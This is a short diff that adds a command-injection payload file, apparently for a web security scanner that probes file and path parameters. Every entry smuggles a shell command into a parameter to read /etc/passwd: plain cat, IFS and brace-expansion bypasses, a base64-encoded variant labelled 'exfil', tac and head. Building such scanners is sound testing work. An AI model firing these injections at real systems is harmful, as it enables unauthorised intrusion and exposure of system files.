@@ -1,0 +1,27 @@
+# @default_os:     linux
+# @default_signal: linux_passwd
+# @default_blind:  false
+# @default_tier:   2
+#
+# Payloads for file/path/dir parameters.
+# Loaded when param name matches file-related keywords.
+# Combines CMDi with path traversal probe for double-coverage.
+
+# @label: Cat passwd direct
+;cat /etc/passwd
+
+# @label: Cat passwd IFS
+;cat${IFS}/etc/passwd
+
+# @label: Cat passwd brace
+;{cat,/etc/passwd}
+
+# @label: Cat passwd b64 exfil
+# @signal: system:linux_user
+;cat /etc/passwd|base64 -w0
+
+# @label: Tac passwd (reverse cat)
+;tac /etc/passwd
+
+# @label: Head passwd 1 line
+;head -1 /etc/passwd
